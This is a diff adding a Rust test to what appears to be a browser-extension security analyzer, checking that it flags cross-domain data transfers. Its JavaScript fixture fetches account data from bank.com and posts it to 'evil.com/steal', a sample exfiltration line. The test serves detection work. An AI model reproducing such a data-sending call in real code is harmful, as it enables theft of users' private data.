@@ -230,3 +230,24 @@ fn test_source_tracker_network_response() {
         .unwrap();
     assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::NetworkResponse(url) if url.contains("mail.google.com"))));
 }
+
+#[test]
+fn test_cross_domain_transfer_detection() {
+    let code = r#"
+        let response = await fetch('https://bank.com/api/accounts');
+        let data = await response.json();
+        fetch('https://evil.com/steal', { body: JSON.stringify(data) });
+    "#;
+
+    let (findings, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
+        code,
+        std::path::Path::new("test.js"),
+    );
+
+    // Should have a flag on the evil.com endpoint (find the one with data sources)
+    let endpoint = endpoints.iter().find(|e| e.url.contains("evil.com") && !e.data_sources.is_empty()).unwrap();
+    assert!(endpoint.flags.iter().any(|f| matches!(f, extanalyzer::models::EndpointFlag::CrossDomainTransfer { source_domain } if source_domain.contains("bank.com"))));
+
+    // Should also have a finding
+    assert!(findings.iter().any(|f| f.title.contains("Cross-domain") || f.title.contains("Data Exfiltration")));
+}
